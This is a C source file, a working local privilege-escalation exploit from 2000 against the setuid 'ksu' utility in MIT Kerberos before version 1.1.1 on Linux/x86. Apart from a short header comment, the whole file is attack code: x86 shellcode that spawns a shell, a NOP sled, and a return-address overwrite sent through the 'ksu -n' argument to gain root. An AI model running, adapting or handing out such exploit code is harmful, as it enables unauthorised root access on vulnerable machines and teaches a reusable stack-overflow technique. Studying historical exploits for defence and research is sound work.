/********
 * ksux.c -- ksu exploit
 * written January 26, 2000
 * Jim Paris <jim@jtan.com>
 * 
 * This program exploits a vulnerability in the 'ksu' utility included
 * with the MIT Kerberos distribution.  Versions prior to 1.1.1 are   
 * vulnerable.
 * 
 * This exploit is for Linux/x86 with Kerberos version 1.0.  Exploits
 * for other operating systems and versions of Kerberos should also work.
 * 
 * Since krb5_parse_name will reject input with an @ or /, this shellcode
 * execs 'sh' instead of '/bin/sh'.  As a result, a copy of 'sh' must    
 * reside in the current directory for the exploit to work. 
 * 
 */
   
#include <stdlib.h>
#include <stdio.h> 

int get_esp(void) { __asm__("movl %esp,%eax"); }

char *shellcode="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x02\x89\x46"
                "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
                "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xffsh"; 
                
#define         LEN 0x300
#define  RET_OFFSET 0x240
#define  JMP_OFFSET 0x240
#define CODE_OFFSET 0x100

int main(int argc, char *argv[])
{
  int esp=get_esp();
  int i,j; char b[LEN];
  
  memset(b,0x90,LEN);
  memcpy(b+CODE_OFFSET,shellcode,strlen(shellcode));
  *(int *)&b[RET_OFFSET]=esp+JMP_OFFSET;
  b[RET_OFFSET+4]=0;
  
  execlp("ksu","ksu","-n",b,NULL);
} 
